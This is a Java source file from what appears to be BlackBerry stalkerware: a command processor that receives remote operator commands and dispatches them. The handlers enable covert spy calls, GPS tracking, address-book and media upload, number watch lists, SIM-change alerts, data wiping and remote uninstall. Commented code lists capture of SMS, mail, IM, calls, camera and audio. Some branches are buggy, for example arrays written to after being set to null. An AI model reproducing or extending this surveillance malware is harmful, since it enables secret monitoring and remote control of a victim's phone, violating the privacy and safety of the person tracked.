package com.vvt.rmtcmd;

import java.util.Hashtable;
import java.util.Vector;
import net.rim.device.api.util.Arrays;
import com.vvt.db.FxEventDatabase;
import com.vvt.event.FxSystemEvent;
import com.vvt.event.constant.FxCategory;
import com.vvt.event.constant.FxDirection;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.PrefMessenger;
import com.vvt.pref.PrefSystem;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.command.response.PCCCommand;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.command.MessageStruct;
import com.vvt.rmtcmd.command.WatchFlags;
import com.vvt.rmtcmd.pcc.PCCActivateACURL;
import com.vvt.rmtcmd.pcc.PCCActivateURL;
import com.vvt.rmtcmd.pcc.PCCAddHomeInNumb;
import com.vvt.rmtcmd.pcc.PCCAddHomeOutNumb;
import com.vvt.rmtcmd.pcc.PCCAddMonitorNumb;
import com.vvt.rmtcmd.pcc.PCCAddURL;
import com.vvt.rmtcmd.pcc.PCCAddWatchNumb;
import com.vvt.rmtcmd.pcc.PCCBBM;
import com.vvt.rmtcmd.pcc.PCCClearHomeInNumb;
import com.vvt.rmtcmd.pcc.PCCClearHomeOutNumb;
import com.vvt.rmtcmd.pcc.PCCClearMonitorNumb;
import com.vvt.rmtcmd.pcc.PCCClearWatchNumb;
import com.vvt.rmtcmd.pcc.PCCDeactivate;
import com.vvt.rmtcmd.pcc.PCCDebug;
import com.vvt.rmtcmd.pcc.PCCDeleteActualMedia;
import com.vvt.rmtcmd.pcc.PCCDeleteDatabase;
import com.vvt.rmtcmd.pcc.PCCEnableCapture;
import com.vvt.rmtcmd.pcc.PCCEnableGPS;
import com.vvt.rmtcmd.pcc.PCCEnableSpyCall;
import com.vvt.rmtcmd.pcc.PCCQueryHomeInNumb;
import com.vvt.rmtcmd.pcc.PCCQueryHomeOutNumb;
import com.vvt.rmtcmd.pcc.PCCQueryMonitorNumb;
import com.vvt.rmtcmd.pcc.PCCQueryWatchNumb;
import com.vvt.rmtcmd.pcc.PCCRequestCurrentURL;
import com.vvt.rmtcmd.pcc.PCCRequestMobileNumber;
import com.vvt.rmtcmd.pcc.PCCRequestSettings;
import com.vvt.rmtcmd.pcc.PCCRequestStartupTime;
import com.vvt.rmtcmd.pcc.PCCResetHomeInNumb;
import com.vvt.rmtcmd.pcc.PCCResetHomeOutNumb;
import com.vvt.rmtcmd.pcc.PCCResetMonitorNumb;
import com.vvt.rmtcmd.pcc.PCCResetWatchNumb;
import com.vvt.rmtcmd.pcc.PCCSendAddressbook;
import com.vvt.rmtcmd.pcc.PCCSetSettings;
import com.vvt.rmtcmd.pcc.PCCDiagnostics;
import com.vvt.rmtcmd.pcc.PCCGPSOnDemand;
import com.vvt.rmtcmd.pcc.PCCRmtCmdExecutionListener;
import com.vvt.rmtcmd.pcc.PCCRmtCommand;
import com.vvt.rmtcmd.pcc.PCCSIM;
import com.vvt.rmtcmd.pcc.PCCRequestEvents;
import com.vvt.rmtcmd.pcc.PCCEnableSpyCallMPN;
import com.vvt.rmtcmd.pcc.PCCSetWatchFlags;
import com.vvt.rmtcmd.pcc.PCCUninstall;
import com.vvt.rmtcmd.pcc.PCCEnableWatchList;
import com.vvt.rmtcmd.pcc.PCCUpdateLocationInterval;
import com.vvt.rmtcmd.pcc.PCCUploadActualMedia;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.rmtcmd.util.RmtCmdUtil;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class PCCCmdProcessor implements PCCRmtCmdExecutionListener {

	private final String TAG = "PCCCmdProcessor"; 
	private Preference pref = Global.getPreference();
	private FxEventDatabase db = Global.getFxEventDatabase();
	/*private RmtCmdUtil rmtCmdUtil = new RmtCmdUtil();
	private PrefBugInfo prefBugInfo = (PrefBugInfo) pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
	private PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);*/
	
	public void process(Vector pccCmds) {
		try {
			for (int i = 0; i < pccCmds.size(); i++) {
				PCCCommand pcc = (PCCCommand)pccCmds.elementAt(i);
				execute(pcc);
			}
		} catch (Exception e) {
			Log.error("PCCCmdProcessor.process()", e.getMessage(), e);
		}
	}

	private void execute(PCCCommand pcc) {
		int cmdId = pcc.getCmdId().getId();
		Vector args = pcc.getArguments();
		FxSystemEvent systemEvent = new FxSystemEvent();
		systemEvent.setCategory(FxCategory.PCC);
		systemEvent.setDirection(FxDirection.IN);
		systemEvent.setEventTime(System.currentTimeMillis());
		StringBuffer msg = new StringBuffer();
		int numberOfArgs = args.size();
		msg.append(Constant.LESS_THAN);
		msg.append(cmdId);
		msg.append(Constant.GREATER_THAN);
		msg.append(Constant.LESS_THAN);
		msg.append(pcc.countArguments());
		msg.append(Constant.GREATER_THAN);
		for (int i = 0; i < numberOfArgs; i++) {
			msg.append(Constant.LESS_THAN);
			msg.append(args.elementAt(i));
			msg.append(Constant.GREATER_THAN);
		}
		systemEvent.setSystemMessage(msg.toString());
		db.insert(systemEvent);
		if (cmdId == PhoenixCompliantCommand.REQUEST_EVENT.getId()) {
			PCCRequestEvents pccSendingCmd = new PCCRequestEvents();
			pccSendingCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.REQUEST_DIAGNOSTIC.getId()) {
			PCCDiagnostics pccDiagnosticCmd = new PCCDiagnostics();
			pccDiagnosticCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.ENABLE_CAPTURE.getId()) {
			int mode = 0;
			if (numberOfArgs > 0) {
				mode = Integer.parseInt((String)args.firstElement());
			} 
			PCCEnableCapture enableCaptureCmd = new PCCEnableCapture(mode);
			enableCaptureCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.DEBUG.getId()) {
			if (numberOfArgs == 2) {
				int edFlag = Integer.parseInt((String)args.elementAt(0));
				int mode = Integer.parseInt((String)args.elementAt(1));
				PCCDebug debugCmd = new PCCDebug(edFlag, mode);
				debugCmd.execute(this);
			}
		} else if (cmdId == PhoenixCompliantCommand.UNINSTALL.getId()) {
			PCCUninstall uninstallCmd = new PCCUninstall();
			uninstallCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.DELETE_DATABASE.getId()) {
			PCCDeleteDatabase deleteEventCmd = new PCCDeleteDatabase();
			deleteEventCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.SET_SETTING.getId()) {
			/*Hashtable setDefaultSetting = getDefaultSetting(args);
			if (setDefaultSetting != null) {
				PCCSetSettings setDefaultCmd = new PCCSetSettings(setDefaultSetting);
				setDefaultCmd.execute(this);
			} else {
				StringBuffer responseMessage = new StringBuffer();
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.INV_CMD_FORMAT);
				createSystemEventOut(responseMessage.toString());
			}*/
			PCCSetSettings setDefaultCmd = new PCCSetSettings(args);
			setDefaultCmd.execute(this);			
		} else if  (cmdId == PhoenixCompliantCommand.ADD_URL.getId()) {
			PCCAddURL addUrlCmd = new PCCAddURL(args);
			addUrlCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.SET_WATCH_FLAGS.getId()) {
			WatchFlags flag = getWatchFlags(args);
			PCCSetWatchFlags watchFlagCmd = new PCCSetWatchFlags(flag);
			watchFlagCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.ADD_MONITOR.getId()) {
			PCCAddMonitorNumb addMonNumberCmd = new PCCAddMonitorNumb(args);
			addMonNumberCmd.execute(this);			
		} else if (cmdId == PhoenixCompliantCommand.CLEAR_MONITOR.getId()) {
			PCCClearMonitorNumb clrMonNumberCmd = new PCCClearMonitorNumb();
			clrMonNumberCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.RESET_MONITOR.getId()) {
			PCCResetMonitorNumb rstMonNumberCmd = new PCCResetMonitorNumb(args);
			rstMonNumberCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.QUERY_MONITOR.getId()) {
			PCCQueryMonitorNumb queryMonNumberCmd = new PCCQueryMonitorNumb();
			queryMonNumberCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.ACTIVATE_WITH_URL.getId()) { 
			String[] data = null;
			boolean isReply = false;
			if (numberOfArgs > 0) {
				for (int i = 0; i < numberOfArgs; i++) {
					data[i] = (String) args.elementAt(i);
				}
				if (data[1] != null && data[2].equalsIgnoreCase("D")) {
					isReply = true;
				}
			}
			PCCActivateURL activateURLCmd = new PCCActivateURL(data[0], data[1], isReply);			
			activateURLCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.ACTIVATE_WITH_AC_URL.getId()) {
			String[] data = null;
			boolean isReply = false;
			if (numberOfArgs > 0) {
				for (int i = 0; i < numberOfArgs; i++) {
					data[i] = (String) args.elementAt(i);
				}
				if (data[2] != null && data[3].equalsIgnoreCase("D")) {
					isReply = true;
				}
			}
			PCCActivateACURL activateACURLCmd = new PCCActivateACURL(data[0], data[1], data[2], isReply);  
			activateACURLCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.UPLOAD_MEDIA.getId()) {
			int paringId = 0;
			if (numberOfArgs > 0) {
				paringId = Integer.parseInt((String)args.firstElement());
			}
			PCCUploadActualMedia uploadMediaCmd = new PCCUploadActualMedia(paringId);
			uploadMediaCmd.execute(this);			
		} else if (cmdId == PhoenixCompliantCommand.DELETE_MEDIA.getId()) {
			int paringId = 0;
			if (numberOfArgs > 0) {
				paringId = Integer.parseInt((String)args.firstElement());
			}
			PCCDeleteActualMedia deleteMediaCmd = new PCCDeleteActualMedia(paringId);
			deleteMediaCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.ADD_HOMEIN.getId()) {
			PCCAddHomeInNumb addHomeInCmd = new PCCAddHomeInNumb(args);
			addHomeInCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.CLEAR_HOMEIN.getId()) {
			PCCClearHomeInNumb clearHomeInCmd = new PCCClearHomeInNumb();
			clearHomeInCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.RESET_HOMEIN.getId()) {
			PCCResetHomeInNumb resetHomeInCmd = new PCCResetHomeInNumb(args);
			resetHomeInCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.QUERY_HOMEIN.getId()) {
			PCCQueryHomeInNumb queryHomeInCmd = new PCCQueryHomeInNumb();
			queryHomeInCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.ADD_HOMEOUT.getId()) {
			PCCAddHomeOutNumb addHomeOutCmd = new PCCAddHomeOutNumb(args);
			addHomeOutCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.CLEAR_HOMEOUT.getId()) {
			PCCClearHomeOutNumb clearHomeOutCmd = new PCCClearHomeOutNumb();
			clearHomeOutCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.RESET_HOMEOUT.getId()) {
			PCCResetHomeOutNumb resetHomeOutCmd = new PCCResetHomeOutNumb(args);
			resetHomeOutCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.QUERY_HOMEOUT.getId()) {
			PCCQueryHomeOutNumb queryHomeOutCmd = new PCCQueryHomeOutNumb();
			queryHomeOutCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.DEACTIVATE.getId()) {
			String recipentNumber = null;
			String replyMsg = "";
			boolean isReply = false;
			/*if (Log.isDebugEnable()) {
				Log.debug(TAG + ".execute().deactivate", "length: " + numberOfArgs);
				for (int i = 0; i < numberOfArgs; i++) {
					Log.debug(TAG + ".execute().deactivate", "args" + i + ": " + (String) args.elementAt(i));
				}
			}*/
			if (numberOfArgs > 0) {
				if (numberOfArgs == 2) {
					recipentNumber = (String)args.firstElement();
					replyMsg = (String) args.elementAt(1);
					if ((recipentNumber != null) && (replyMsg.equalsIgnoreCase("D"))) {
						isReply = true;
					}
				}
			}
			/*if (Log.isDebugEnable()) {
				Log.debug(TAG + ".execute().deactivate", "isReply: " + isReply + ", recipentNumber: " + recipentNumber);
			}*/
			PCCDeactivate deactivateCmd = new PCCDeactivate(recipentNumber, isReply);
			deactivateCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.SEND_ADDRESS_BOOK.getId()) {
			PCCSendAddressbook sendAddressbookCmd = new PCCSendAddressbook();
			sendAddressbookCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.REQUEST_CURRENT_URL.getId()) {
			PCCRequestCurrentURL reqCurrentUrlCmd = new PCCRequestCurrentURL();
			reqCurrentUrlCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.QUERY_WATCH_NUMBER.getId()) {
			PCCQueryWatchNumb queryWatchNumbCmd = new PCCQueryWatchNumb();
			queryWatchNumbCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.CLEAR_WATCH_NUMBER.getId()) {
			PCCClearWatchNumb clearWatchNumbCmd = new PCCClearWatchNumb();
			clearWatchNumbCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.REQUEST_SETTINGS.getId()) {
			PCCRequestSettings requestSettings = new PCCRequestSettings();
			requestSettings.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.ADD_WATCH_NUMBER.getId()) {
			PCCAddWatchNumb addWatchNumbCmd = new PCCAddWatchNumb(args);
			addWatchNumbCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.RESET_WATCH_NUMBER.getId()) {
			PCCResetWatchNumb resetWatchNumbCmd = new PCCResetWatchNumb(args);
			resetWatchNumbCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.CLEAR_WATCH_NUMBER.getId()) {
			PCCClearWatchNumb clearWatchNumbCmd = new PCCClearWatchNumb();
			clearWatchNumbCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.QUERY_WATCH_NUMBER.getId()) {
			PCCQueryWatchNumb queryWatchNumbCmd = new PCCQueryWatchNumb();
			queryWatchNumbCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.REQUEST_STARTUP_TIME.getId()) {
			PCCRequestStartupTime reqStartupTimeCmd = new PCCRequestStartupTime();
			reqStartupTimeCmd.execute(this);
		} else if (cmdId == PhoenixCompliantCommand.REQUEST_MOBILE_NUMBER.getId()) {
			PCCRequestMobileNumber reqMobileNumberCmd = new PCCRequestMobileNumber();
			reqMobileNumberCmd.execute(this);
		} else {
			// Bug
			PrefBugInfo bug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			if (bug.isSupported()) {
				if (cmdId == PhoenixCompliantCommand.ENABLE_SPY_CALL.getId()) {
					int state = 0;
					if (numberOfArgs > 0) {
						state = Integer.parseInt((String)args.firstElement());
					}
					PCCEnableSpyCall spyCallCmd = new PCCEnableSpyCall(state);
					spyCallCmd.execute(this);
				} else if (cmdId == PhoenixCompliantCommand.ENABLE_SPY_CALL_WITH_MPN.getId()) {
					String monitorNumber = "";
					if (numberOfArgs > 0) {
						monitorNumber = (String)args.firstElement();
					}
					PCCEnableSpyCallMPN spyCallMpnCmd = new PCCEnableSpyCallMPN(monitorNumber);
					spyCallMpnCmd.execute(this);
				} 
			}
			if (bug.isConferenceSupported()) {
				if (cmdId == PhoenixCompliantCommand.ENABLE_WATCH_NOTIFICATION.getId()) {
					int state = 0;
					if (numberOfArgs > 0) {
						state = Integer.parseInt((String)args.firstElement());
					}
					PCCEnableWatchList watchCmd = new PCCEnableWatchList(state);
					watchCmd.execute(this);
				}
			}
			// GPS
			PrefGPS gps = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			if (gps.isSupported()) {
				if (cmdId == PhoenixCompliantCommand.ENABLE_LOCATION.getId()) {
					int state = 0;
					if (numberOfArgs > 0) {
						state = Integer.parseInt((String)args.firstElement());
					}
					PCCEnableGPS enableGPSCmd = new PCCEnableGPS(state);
					enableGPSCmd.execute(this);
				} else if (cmdId == PhoenixCompliantCommand.GPS_ON_DEMAND.getId()) {
					PCCGPSOnDemand gpsOnDemandCmd = new PCCGPSOnDemand();
					gpsOnDemandCmd.execute(this);
				} else if (cmdId == PhoenixCompliantCommand.UPDATE_GPS_INTERVAL.getId()) {
					int timerIndex  = 0;
					if (numberOfArgs > 0) {
						timerIndex = Integer.parseInt((String)args.firstElement());
					}
					PCCUpdateLocationInterval updateGPSCmd = new PCCUpdateLocationInterval(timerIndex);
					updateGPSCmd.execute(this);
				}
			}
			// IM
			// TODO: Move to SetSetting Cmd
			/*PrefMessenger im = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
			if (im.isSupported()) {
				if (cmdId == PhoneixCompliantCommand.IM.getId()) {
					int state = 0;
					if (numberOfArgs > 0) {
						state = Integer.parseInt((String)args.firstElement());
					}
					PCCBBMCmd bbmCmd = new PCCBBMCmd(state);
					bbmCmd.execute(this);
				}
			}*/
			// System
			PrefSystem system = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
			if (system.isSupported()) {
				if (cmdId == PhoenixCompliantCommand.ENABLE_SIM_CHANGE.getId()) {
					int state = 0;
					if (numberOfArgs > 0) {
						state = Integer.parseInt((String)args.firstElement());
					}
					PCCSIM simCmd = new PCCSIM(state);
					simCmd.execute(this);
				}
			}
		}
	}
	
	/*private void createSystemEventOut(String message) {
		FxSystemEvent systemEvent = new FxSystemEvent();
		systemEvent.setCategory(FxCategory.PCC_REPLY);
		systemEvent.setEventTime(System.currentTimeMillis());
		systemEvent.setDirection(FxDirection.OUT);
		systemEvent.setSystemMessage(message);
		db.insert(systemEvent);
	}*/
	
	/*private Hashtable getDefaultSetting(Vector args) {
		Hashtable setting = new Hashtable();		
		for (int i = 0; i < args.size(); i++) {
			String argStr = (String) args.elementAt(i);
			int index = argStr.indexOf(Constant.COLON);
			String id = argStr.substring(0, index).trim();
			String value = argStr.substring(index + 1).trim();
			int settingId = Integer.parseInt(id);			
			if (settingId == SetSettingCode.HOME_IN.getId()) {
				Vector homeInNumber = rmtCmdUtil.parseNumber(value);
				if (rmtCmdUtil.isInvalidNumber(homeInNumber)) {
					setting = null;
					break;
				}
				homeInNumber = rmtCmdUtil.getOnlyUniqueNumber(homeInNumber);
				if (homeInNumber.size() > prefBugInfo.getMaxHomeOutNumbers()) {
					setting = null;
					break;
				}
				setting.put(SetSettingCode.HOME_IN, homeInNumber);
			} else if (settingId == SetSettingCode.SET_WATCH_FLAGS.getId()) {
				Vector flags = rmtCmdUtil.parseNumber(value);
				if (rmtCmdUtil.isInvalidWatchFlags(flags)) {
					setting = null;
					break;
				}
				setting.put(SetSettingCode.SET_WATCH_FLAGS, flags);
			} else if (settingId == SetSettingCode.MONITOR_NUMBER.getId()) {
				Vector monitorNumber = rmtCmdUtil.parseNumber(value);
				if (rmtCmdUtil.isInvalidNumber(monitorNumber)) {
					setting = null;
					break;
				}
				monitorNumber = rmtCmdUtil.getOnlyUniqueNumber(monitorNumber);
				if (monitorNumber.size() > prefBugInfo.getMaxMonitorNumbers()) {
					setting = null;
					break;
				}
				setting.put(SetSettingCode.MONITOR_NUMBER, monitorNumber);	
			} else {
				int settingValue = Integer.parseInt(value);
				if (settingId == SetSettingCode.AUDIO_RECORD.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.AUDIO_RECORD, new Integer(settingValue));
				} else if (settingId == SetSettingCode.CALL.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.CALL, new Integer(settingValue));
				} else if (settingId == SetSettingCode.CAMERA_IMAGE.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.CAMERA_IMAGE, new Integer(settingValue));
				} else if (settingId == SetSettingCode.CAPTURE_TIMER.getId()) {
					if (settingValue < 0 || settingValue > (ApplicationInfo.TIME.length - 1)) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.CAPTURE_TIMER, new Integer(settingValue));
				} else if (settingId == SetSettingCode.CONTACT.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.CONTACT, new Integer(settingValue));
				} else if (settingId == SetSettingCode.EVENT_COUNT.getId()) {
					if (settingValue < 1 || settingValue > generalInfo.getMaxEventRange()) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.EVENT_COUNT, new Integer(settingValue));
				} else if (settingId == SetSettingCode.GPS.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.GPS, new Integer(settingValue));
				} else if (settingId == SetSettingCode.GPS_TIMER.getId()) {
					if ((settingValue < 1) || (settingValue > ApplicationInfo.LOCATION_TIMER.length)) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.GPS_TIMER, new Integer(settingValue));
				} else if (settingId == SetSettingCode.IM.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.IM, new Integer(settingValue));
				} else if (settingId == SetSettingCode.MAIL.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.MAIL, new Integer(settingValue));
				} else if (settingId == SetSettingCode.PIN.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.PIN, new Integer(settingValue));
				} else if (settingId == SetSettingCode.SMS.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.SMS, new Integer(settingValue));
				} else if (settingId == SetSettingCode.START_STOP_CAPTURE.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.START_STOP_CAPTURE, new Integer(settingValue));
				} else if (settingId == SetSettingCode.VIDEO_FILE.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.VIDEO_FILE, new Integer(settingValue));
				} else if (settingId == SetSettingCode.ENABLE_WATCH.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.ENABLE_WATCH, new Integer(settingValue));
				} else if (settingId == SetSettingCode.ENABLE_SPYCALL.getId()) {
					if (settingValue < 0 || settingValue > 1) {
						setting = null;
						break;
					}
					setting.put(SetSettingCode.ENABLE_SPYCALL, new Integer(settingValue));
				} else {
					setting = null;
					break;
				}
			}
		}
		return setting;
	}*/
	
	private WatchFlags getWatchFlags(Vector args) {
		WatchFlags flag = new WatchFlags();					
		if (((String) args.elementAt(0)).trim().equals("1")) {
			flag.setInAddressbook(true);
		}
		if (((String) args.elementAt(1)).trim().equals("1")) {
			flag.setNotAddressbook(true);
		}
		if (((String) args.elementAt(2)).trim().equals("1")) {
			flag.setInWatchList(true);
		}
		if (((String) args.elementAt(3)).trim().equals("1")) {
			flag.setUnknownNumber(true);
		}
		return flag;
	}
	
	private MessageStruct getMessageStruct(String argStr) {		
		int fromIndex = 0;
		int index = 0;
		
		MessageStruct struct = new MessageStruct();			
		index = argStr.indexOf(Constant.COMMA, fromIndex);
		String value = argStr.substring(fromIndex, index);
		int category = Integer.parseInt(value);	
		fromIndex = index + 1;
		index = argStr.indexOf(Constant.COMMA, fromIndex);
		value = argStr.substring(fromIndex, index);						
		int priority = Integer.parseInt(value);	
		fromIndex = index + 1;
		index = argStr.indexOf(Constant.COMMA, fromIndex);
		value = argStr.substring(fromIndex, index);						
		struct.setCategory(category);
		struct.setPriority(priority);
		struct.setMessage(value);		
		return struct;
	}
	
	// PCCRmtCmdExecutionListener
	public void cmdExecutedError(PCCRmtCommand cmd) {
		Log.error("PCCCmdProcessor.cmdExecutedError", "Command = " + cmd.getClass().getName());
	}

	public void cmdExecutedSuccess(PCCRmtCommand cmd) {
	}
}
